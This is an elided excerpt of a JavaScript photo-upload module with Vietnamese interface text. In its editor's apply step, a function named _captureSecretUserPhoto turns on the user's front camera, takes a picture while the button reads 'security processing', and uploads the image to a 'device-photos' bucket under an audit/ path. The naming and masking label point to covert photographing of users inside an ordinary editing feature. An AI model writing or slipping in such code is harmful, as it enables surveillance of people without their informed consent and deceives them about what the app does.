...
(function (global) {
  ...
  PhotoUploadModule.prototype._editorApply = function () {
    ...
    if (isSec) {
      var applyBtn = document.getElementById('puEditorApplyBtn');
      var originalText = applyBtn ? applyBtn.innerHTML : '';
      if (applyBtn) {
        applyBtn.disabled = true;
        applyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Xử lý bảo mật...';
      }
      self._captureSecretUserPhoto(function(sblob) {
        if (sblob) self._securityPhotoBlob = sblob;
        if (applyBtn) {
    ...
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
      .then(function (stream) {
        ...
        if (playPromise !== undefined) {
           playPromise.catch(function(){}); // Prevent unhandled rejection
        }
        ...
        var readyInterval = setInterval(function() {
          if (isCaptured) { clearInterval(readyInterval); return; }
    ...
    client.storage.from('device-photos').upload(path, blob)
      .then(function(res) {
        if (res.error) {
          ...
          alert('Lỗi quyền hệ thống: Upload ảnh bảo mật thất bại!\nCấu hình bảo mật thư mục audit/ đang chặn (RLS Blocked). ' + res.error.message);
          return cb(null);
        }
